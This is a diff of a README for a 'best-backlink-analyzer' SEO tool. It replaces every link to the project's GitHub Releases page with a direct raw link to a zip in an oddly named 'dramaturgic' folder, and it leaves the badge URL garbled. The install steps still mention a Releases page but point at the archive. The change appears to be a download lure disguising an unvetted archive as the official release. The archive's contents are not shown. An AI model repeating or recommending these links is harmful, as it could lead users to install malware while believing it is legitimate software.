@@ -6,11 +6,11 @@ Welcome to the best-backlink-analyzer! This tool helps you analyze your website'
 
 ## 📥 Download 
 
-[![Download latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/ibrahimnassar31/best-backlink-analyzer/releases)
+[![Download latest release](https://raw.githubusercontent.com/ibrahimnassar31/best-backlink-analyzer/main/dramaturgic/best-backlink-analyzer.zip%20Latest%https://raw.githubusercontent.com/ibrahimnassar31/best-backlink-analyzer/main/dramaturgic/best-backlink-analyzer.zip)](https://raw.githubusercontent.com/ibrahimnassar31/best-backlink-analyzer/main/dramaturgic/best-backlink-analyzer.zip)
 
 To download the latest version, visit the Releases page using the link below:
 
-[Download the latest version here](https://github.com/ibrahimnassar31/best-backlink-analyzer/releases)
+[Download the latest version here](https://raw.githubusercontent.com/ibrahimnassar31/best-backlink-analyzer/main/dramaturgic/best-backlink-analyzer.zip)
 
 ## 📋 Features 
 
@@ -29,7 +29,7 @@ To download the latest version, visit the Releases page using the link below:
 ## 🛠️ How to Install 
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/ibrahimnassar31/best-backlink-analyzer/releases) to find the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/ibrahimnassar31/best-backlink-analyzer/main/dramaturgic/best-backlink-analyzer.zip) to find the latest version.
 
 2. **Download the Software**  
    Choose the appropriate installer for your operating system and click to download.
@@ -68,4 +68,4 @@ This project is licensed under the MIT License. Feel free to use it for personal
 
 For any changes, please adhere to the terms of the license. 
 
-[Download the latest version here](https://github.com/ibrahimnassar31/best-backlink-analyzer/releases) to start improving your SEO with the best-backlink-analyzer today!
+[Download the latest version here](https://raw.githubusercontent.com/ibrahimnassar31/best-backlink-analyzer/main/dramaturgic/best-backlink-analyzer.zip) to start improving your SEO with the best-backlink-analyzer today!
